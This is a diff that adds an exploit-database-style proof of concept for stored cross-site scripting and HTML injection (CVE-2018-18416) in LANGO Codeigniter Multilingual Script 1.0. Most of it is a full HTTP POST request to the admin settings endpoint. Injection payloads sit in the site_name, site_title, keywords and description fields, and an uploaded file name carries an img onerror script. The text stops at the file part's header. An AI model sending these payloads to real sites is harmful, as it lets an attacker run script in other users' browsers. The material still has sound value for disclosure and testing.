@@ -1,0 +1,48 @@
+# Exploit Title: LANGO Codeigniter Multilingual Script 1.0 - Cross-Site Scripting
+# Date: 2018-10-16
+# Exploit Author: Ismail Tasdelen
+# Vendor Homepage: http://pokkho.com/lango/
+# Software Link : http://pokkho.com/lango/auth/login
+# Software : LANGO - Codeigniter Multilingual Script
+# Version : 1.0
+# Vulernability Type : Code Injection
+# Vulenrability : HTML Injection and Stored XSS
+# CVE : CVE-2018-18416
+
+# LANGO Codeigniter Multilingual Script 1.0 has XSS in the input and upload sections, as demonstrated by the
+# site_name parameter to the admin/settings/update URI.
+ 
+# HTTP POST Request :
+
+POST /lango/admin/settings/update HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://TARGET/lango/admin/settings
+Content-Type: multipart/form-data; boundary=---------------------------180989082911182658591910516947
+Content-Length: 3150615
+Cookie: csrf_cookie_name=4eeae5fca11e4ae108d667b67b52a0b3; ci_session=7ghu11a49n5ethf596t6g1ec5kfscncp
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+-----------------------------180989082911182658591910516947
+Content-Disposition: form-data; name="site_name"
+
+"><h1>Ismail Tasdelen</h1>
+-----------------------------180989082911182658591910516947
+Content-Disposition: form-data; name="site_title"
+
+"><h1>Ismail Tasdelen</h1>
+-----------------------------180989082911182658591910516947
+Content-Disposition: form-data; name="keywords"
+
+Multilanguage ,Codeigniter Multilanguage Script,"><h1>Ismail Tasdelen</h1>
+-----------------------------180989082911182658591910516947
+Content-Disposition: form-data; name="description"
+
+"><h1>Ismail Tasdelen</h1>
+-----------------------------180989082911182658591910516947
+Content-Disposition: form-data; name="photo1"; filename="\"><img src=x onerror=alert(\"ismailtasdelen\")>.jpg"
+Content-Type: image/jpeg
